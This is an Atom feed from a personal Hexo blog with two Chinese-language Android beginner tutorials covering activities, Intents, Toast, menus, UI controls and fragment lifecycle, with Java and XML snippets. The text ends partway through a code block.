<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nuoye</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nuoye-blog.github.io/"/>
  <updated>2020-05-27T05:38:56.158Z</updated>
  <id>https://nuoye-blog.github.io/</id>
  
  <author>
    <name>nuoye</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android-day3</title>
    <link href="https://nuoye-blog.github.io/2020/05/27/Android/Android-day3/"/>
    <id>https://nuoye-blog.github.io/2020/05/27/Android/Android-day3/</id>
    <published>2020-05-27T05:40:00.000Z</published>
    <updated>2020-05-27T05:38:56.158Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>UI开发这块跟代码逻辑无关，所以快速扫过吧，具体内容可以直接找找官方文档。</p><h1 id="UI开发"><a href="#UI开发" class="headerlink" title="UI开发"></a>UI开发</h1><h2 id="常用的控件"><a href="#常用的控件" class="headerlink" title="常用的控件"></a>常用的控件</h2><h3 id="TestView"><a href="#TestView" class="headerlink" title="TestView"></a>TestView</h3><p>用于显示文本显示。</p><h3 id="Button"><a href="#Button" class="headerlink" title="Button"></a>Button</h3><p>用于实现按钮。</p><h3 id="EditText"><a href="#EditText" class="headerlink" title="EditText"></a>EditText</h3><p>用于实现输入框。</p><p>可以使用如下方法获取输入框内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EditText editText;</span><br><span class="line">editText = (EditText) findViewById(R.id.edit_text);</span><br><span class="line">Log.d(<span class="string">"MainActivity"</span>, editText.getText().toString())</span><br></pre></td></tr></table></figure><h3 id="ImageView"><a href="#ImageView" class="headerlink" title="ImageView"></a>ImageView</h3><p>用于在界面上显示图片。</p><p>可以用如下代码修改显示的图片为img_2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ImageView imageView;</span><br><span class="line">imageView &#x3D; (ImageView) findViewById(R.id.image_view);</span><br><span class="line">imageView.setImageResource(R.drawable.img_2);</span><br></pre></td></tr></table></figure><h3 id="ProgressBar"><a href="#ProgressBar" class="headerlink" title="ProgressBar"></a>ProgressBar</h3><p>用于显示进度条，表示我们的程序正在加载一些项目。</p><p>我们通过控件的setVisibility()来传入View.VISIBLE、View.INVISIBLE和View.GONE这三种值来设置控件的可见性，从而可以进行ProgressBar和其他控件的切换。</p><p>getVisibility()方法可以可判断控件是否可见。</p><h3 id="AlertDialog"><a href="#AlertDialog" class="headerlink" title="AlertDialog"></a>AlertDialog</h3><p>用于在当前界面弹出一个对话框，这个对话框是置顶于所有界面元素之上的，能够屏蔽掉其他控件的交互能力。</p><p>可以在活动中用以下代码创建：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">AlertDialog.Builder dialog = <span class="keyword">new</span> AlertDialog.Builder(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">dialog.setTitle(<span class="string">"This is Dialog"</span>);</span><br><span class="line">dialog.setMessage(<span class="string">"Something important"</span>);</span><br><span class="line">dialog.cancelable(<span class="keyword">false</span>);</span><br><span class="line">dialog.setPositiveButton(<span class="string">"OK"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener()&#123;</span><br><span class="line"><span class="meta">@override</span></span><br><span class="line"><span class="function">pubilc <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">dialog.setNegativeButton(<span class="string">"Cancel"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener()&#123;</span><br><span class="line"><span class="meta">@override</span></span><br><span class="line"><span class="function">pubilc <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>创建完成后就可以用dialog.show()调用该AlertDialog了。</p><h3 id="ProgressDialog"><a href="#ProgressDialog" class="headerlink" title="ProgressDialog"></a>ProgressDialog</h3><p>弹出对话框以显示进度条。</p><h2 id="详解四种基本布局"><a href="#详解四种基本布局" class="headerlink" title="详解四种基本布局"></a>详解四种基本布局</h2><p><img src="./day3/1.jpg" alt=""></p><h3 id="LinearLayout线性布局"><a href="#LinearLayout线性布局" class="headerlink" title="LinearLayout线性布局"></a>LinearLayout线性布局</h3><h3 id="RelativeLayout相对布局"><a href="#RelativeLayout相对布局" class="headerlink" title="RelativeLayout相对布局"></a>RelativeLayout相对布局</h3><h3 id="FrameLayout帧布局"><a href="#FrameLayout帧布局" class="headerlink" title="FrameLayout帧布局"></a>FrameLayout帧布局</h3><h3 id="百分比布局"><a href="#百分比布局" class="headerlink" title="百分比布局"></a>百分比布局</h3><h2 id="创建自定义控件"><a href="#创建自定义控件" class="headerlink" title="创建自定义控件"></a>创建自定义控件</h2><p><img src="./day3/2.jpg" alt=""></p><p>View是Android中最基本的一种UI组件，它可以在屏幕上绘制一块矩形区域，并能响应这块区域的各种事件。</p><h2 id="ListView"><a href="#ListView" class="headerlink" title="ListView"></a>ListView</h2><h2 id="RecyclerView"><a href="#RecyclerView" class="headerlink" title="RecyclerView"></a>RecyclerView</h2><h1 id="探究碎片"><a href="#探究碎片" class="headerlink" title="探究碎片"></a>探究碎片</h1><h2 id="什么是碎片"><a href="#什么是碎片" class="headerlink" title="什么是碎片"></a>什么是碎片</h2><p>碎片是一种可以嵌入在活动当中的UI片段，它能让程序更加合理和充分地利用大屏幕的空间。</p><h2 id="动态添加碎片"><a href="#动态添加碎片" class="headerlink" title="动态添加碎片"></a>动态添加碎片</h2><p>动态添加碎片主要分为5步：</p><ol><li>创建待添加的碎片实例。</li><li>获取FragmentManager，在活动中可以直接通过调用getSupportFragmentManager()方法得到。</li><li>开启一个事务，通过调用beginTransaction()方法开启。</li><li>向容器内添加或替换碎片，一般使用replace()方法实现，需要传入容器的id和待添加的碎片实例。</li><li>提交事务，调用commit()方法来完成。</li></ol><h2 id="碎片的生命周期"><a href="#碎片的生命周期" class="headerlink" title="碎片的生命周期"></a>碎片的生命周期</h2><h3 id="碎片的状态和回调"><a href="#碎片的状态和回调" class="headerlink" title="碎片的状态和回调"></a>碎片的状态和回调</h3><h4 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h4><p>运行状态：当一个碎片是可见的，并且它所关联的活动正处于运行状态时，该碎片也处于运行状态。</p><p>暂停状态：当一个活动进入暂停状态，与它相关联的可见碎片就会进入到暂停状态。</p><p>停止状态：当一个活动进入停止状态时，与它相关联的碎片就会进入到停止状态，或者通过调用FragmentTransaction的remove()、replace()方法将碎片从活动中移除，但如果在事务提交之前调用addToBackStack()方法，这时的碎片也会进入到停止状态。</p><p>销毁状态：碎片总是依附于活动而存在的，因此当活动被销毁时，与它相关联的碎片就会进入到销毁状态。或者通过调用FragmentTransaction的remove()、replace()方法将碎片从活动中移除，但在事务提交之前并没有调用addToBackStack()方法，这时的碎片也会进入到销毁状态。</p><h4 id="回调方法"><a href="#回调方法" class="headerlink" title="回调方法"></a>回调方法</h4><p>onAttach()当碎片和活动建立关系的时候调用。</p><p>onCreateView()为碎片创建视图（加载布局）时调用。</p><p>onActivityCreated()确保与碎片相关联的活动一定已经创建完毕的时候调用。</p><p>onDestoryView()当与碎片关联的视图被移除的时候调用。</p><p>onDetach()当碎片和活动解除关联的时候调用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;UI开发这块跟代码逻辑无关，所以快速扫过吧，具体内容可以直接找找官方文档。&lt;/p&gt;
&lt;h1 id=&quot;UI开发&quot;&gt;&lt;a href=&quot;#UI开发
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Android-day2</title>
    <link href="https://nuoye-blog.github.io/2020/05/26/Android/Android-day2/"/>
    <id>https://nuoye-blog.github.io/2020/05/26/Android/Android-day2/</id>
    <published>2020-05-26T08:20:00.000Z</published>
    <updated>2020-05-26T08:16:16.613Z</updated>
    
    <content type="html"><![CDATA[<h1 id="探究活动"><a href="#探究活动" class="headerlink" title="探究活动"></a>探究活动</h1><h2 id="什么是活动"><a href="#什么是活动" class="headerlink" title="什么是活动"></a>什么是活动</h2><p>活动是一种可以包含用户界面的控件，主要用于和用户进行交互。一个应用程序中可以包含零个或多个活动。</p><h2 id="活动的基本用法"><a href="#活动的基本用法" class="headerlink" title="活动的基本用法"></a>活动的基本用法</h2><p>首先我们新建个项目ActivityTest来进行练习，模板选择的时候选择add no activity。</p><h3 id="手动创建活动"><a href="#手动创建活动" class="headerlink" title="手动创建活动"></a>手动创建活动</h3><p>右键点击com.example.activitytest包-&gt;New-&gt;Activity-&gt;Empty Activity。</p><p>取名FirstActivity，并且不要勾选Generate Layout File和Launcher Activity这两个选项。</p><h3 id="创建和加载布局"><a href="#创建和加载布局" class="headerlink" title="创建和加载布局"></a>创建和加载布局</h3><p>右击app/src/main/res目录-&gt;New-&gt;Directory，就会弹出一个新建目录窗口，这里创建一个名为layout的目录。然后对着layout目录右键-&gt;Layout resource file，又会弹出一个新建布局资源的窗口，我们将这个布局文件命名为first_layout，根元素就默认选择为LinearLayout，确认即可。</p><p>然后添加个按钮，修改代码为如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:id</span>=<span class="string">"@+id/button_1"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:text</span>=<span class="string">"Button 1"</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中@+id/button_1表示添加一个button_1的id。随后layout_width指定了当前元素的宽度，layout_height指定当前元素的高度，android:text指定了元素中显示的文字内容。</p><p>重新回到FirstActivity，将onCreate()方法修改为如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.first_layout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在AndroidManifest文件中注册"><a href="#在AndroidManifest文件中注册" class="headerlink" title="在AndroidManifest文件中注册"></a>在AndroidManifest文件中注册</h3><p>实际上Android Studio已经自动帮我们注册了：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".FirstActivity"</span>&gt;</span><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中.FirstActivity是com.example.activitytest.FirstActivity的缩写。因为外层的包已经指定了程序的包名是com.example.activitytest，所以可以直接使用这个缩写就行了。</p><p>另外，仅仅注册了活动，程序仍然是不能运行的，需要为程序配置主活动。即在activity标签内部加入<code>&lt;intent-filter&gt;</code>标签，并且加入<code>&lt;action android:name=&quot;android.intent.action.MAIN&quot;&gt;</code>和<code>&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;&gt;</code>这两句声明即可。</p><p>除此之外，还可以使用android:label指定活动中标题栏的内容。需注意的是，给主活动指定的label不仅会成为标题栏中的内容，还会成为启动器(Launcher)中应用程序显示的名称。</p><p>最终代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".FirstActivity"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">"This is FirstActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>另外，<strong>如果应用程序中没有声明任何一个活动作为主活动，这个程序仍然是可以正常安装的，只是无法在启动器中看到或者打开这个程序。</strong></p><h3 id="在活动中使用Toast"><a href="#在活动中使用Toast" class="headerlink" title="在活动中使用Toast"></a>在活动中使用Toast</h3><p>Toast是Android系统提供的一种非常好的提醒方式，在程序中可以使用它将一些短小的信息通知给用户，这些信息会在一段时间后自动消失，并且不会占用任何屏幕空间。</p><p>首先再onCreate()方法中添加如下代码，使我们再点击按钮的时候弹出一个Toast：（注意设置下自动导包）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Button button1 = (Button) findViewById(R.id.button_1);</span><br><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(FirstActivity.<span class="keyword">this</span>, <span class="string">"You clicked me!"</span>,</span><br><span class="line">                Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中，findViewById()方法用来获取到在布局文件中定义的元素；它返回的是一个View对象。</p><p>onClickListener()方法用来为按钮注册一个监听器，点击按钮时就会执行监听器中的onClick()方法。</p><p>Toast用法非常简单，通过静态方法makeText()创建出一个Toast对象后，调用show()即可显示出来。</p><p>makeText()的第一个参数为Context，即Toast要求的上下文，由于活动本身就是一个Context对象，因此这里直接传入FirstActivity.this即可。第二个参数是显示的文本内容。第三个参数是Toast显示的时长，有两个内置常量可选择：Toast.LENGTH_SHORT和Toast.LENGTH_LONG。</p><p>完成上面的代码修改后编译安装即可。</p><h3 id="在活动中使用menu"><a href="#在活动中使用menu" class="headerlink" title="在活动中使用menu"></a>在活动中使用menu</h3><p>在res目录下新建一个menu文件夹，右击res目录-&gt;New-&gt;Directory，输入文件夹名menu，点击OK。接着再这个文件夹下新建一个main的菜单文件，右击文件夹-&gt;New-&gt;Menu resource file，文件名输入main，点击OK完成创建。</p><p>然后再main.xml文件中输入如下代码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;menu xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span><br><span class="line">&lt;item</span><br><span class="line">android:id=<span class="string">"@+id/add_item"</span></span><br><span class="line">android:title=<span class="string">"Add"</span> /&gt;</span><br><span class="line">&lt;item</span><br><span class="line">android:id=<span class="string">"@+id/remove_item"</span></span><br><span class="line">        android:title=<span class="string">"Remove"</span> /&gt;</span><br><span class="line">&lt;/menu&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;item&gt;</code>标签就是用来创建某一个菜单项，然后通过android:id给这个菜单指定一个唯一的标识符，android:title给这个菜单项指定一个名称。</p><p>然后重新回到FirstActivity中来重写onCreateOptionsMenu()方法，可以用快捷键ctrl+O。然后编写如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">    getMenuInflater().inflate(R.menu.main, menu);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过getMenuInflater()方法可以获得MenuInflater对象，再调用它的inflate()方法就可以给当前活动创建菜单。inflate()接收两个参数，第一个参数用于指定通过哪个资源文件创建菜单，第二个参数用于指定菜单项将添加到哪一个Menu对象中，这里直接用onCreateOptionsMenu()方法传入的参数menu。然后返回true表示允许创建的菜单显示出来，如果返回了false，创建的菜单将无法显示。</p><p>然后就是在FirstActivity中重写onOptionsItemSelected()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(item.getItemId())&#123;</span><br><span class="line">        <span class="keyword">case</span> R.id.add_item:</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">"You clicked Add"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.remove_item:</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">"You clicked Remove"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新编译运行即可。</p><h3 id="销毁一个活动"><a href="#销毁一个活动" class="headerlink" title="销毁一个活动"></a>销毁一个活动</h3><p>Activity类提供了一个finish()方法用来销毁当前活动。</p><p>修改按钮监听器以销毁活动，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                        finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>这时点下按钮，当前的活动便会被销毁了。</p><h2 id="使用Intent在活动之间穿梭"><a href="#使用Intent在活动之间穿梭" class="headerlink" title="使用Intent在活动之间穿梭"></a>使用Intent在活动之间穿梭</h2><p>Intent是Android程序中各组件之间进行交互的一种重要方式，它不仅可以指明当前组件想要执行的动作，还可以在不同组件之间传递数据。Intent一般可被用于启动活动、启动服务以及发送广播等场景。</p><p>Intent大致可以分为两种：显示Intent和隐式Intent。</p><h3 id="使用显示Intent"><a href="#使用显示Intent" class="headerlink" title="使用显示Intent"></a>使用显示Intent</h3><p>首先创建一个空的Activity，命名为SecondActivity，并勾选Genrate Layout File，给布局文件起名为second_layout，但不要勾选Launcher Activity选项。</p><p>将second_layout.xml替换为如下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/button_2"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Button 2"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后SecondActivity中保持不变即可。</p><p>Intent有多个构造函数的重载，其中一个是Intent(Context packageContext, Class&lt;?&gt;cls)。这个构造函数接收两个参数，第一个参数Context要求提供一个启动活动的上下文，第二个参数Class则是指定想要启动的目标活动，通过这个构造函数就可以构造出Intent的意图。Activity类中提供了一个startActivity()方法，这个方法是专门用于启动活动的，它接收一个Intent参数。</p><p>修改FirstActivity中的按钮点击事件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    Intent inten = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样按下按钮后就可以切换到SecondActivity了，如果要返回上一个活动的话按下Back键就可以销毁当前活动，从而回到上一个活动了。</p><h3 id="使用隐式Intent"><a href="#使用隐式Intent" class="headerlink" title="使用隐式Intent"></a>使用隐式Intent</h3><p>相比于显示Intent，隐式Intent不明确指出想要启动哪个活动，而是指定了一系列更为抽象的action和category等信息，然后交由系统去分析这个Intent，并找出合适的活动去启动。</p><p>通过在<code>&lt;activity&gt;</code>标签下配置<code>&lt;intent-filter&gt;</code>的内容，可以指定当前活动能够响应的action和category：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".SecondActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.example.activitytest.ACTION_START"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;action&gt;</code>标签中指定了当前活动可以响应com.example.activitytest.ACTION_START这个action，而<code>&lt;category&gt;</code>则包含了一些附加信息，更精确地指明了当前活动能够响应的Intent中还可能带有category。只有<code>&lt;action&gt;</code>和<code>&lt;category&gt;</code>的内容同时能够匹配上Intent中指定的action和category时，这个活动才能响应该Intent。</p><p>修改按钮点击事件如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.activitytest.ACTION_START"</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>因为设置了android.intent.category.DEFAULT，所以在调用startActivity()方法时会自动将这个category添加到Intent中。</p><p>可以通过修改如下代码来添加一个category：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.activitytest.ACTION_START"</span>);</span><br><span class="line">        intent.addCategory(<span class="string">"com.example.activitytest.MY_CATEGORY"</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>同时别忘了在<code>&lt;intent-filter&gt;</code>标签中声明该可以响应这个目录：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.example.activitytest.ACTION_START"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"com.example.activitytest.MY_CATEGORY"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="更多的隐式用法"><a href="#更多的隐式用法" class="headerlink" title="更多的隐式用法"></a>更多的隐式用法</h3><p>打开网页：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td 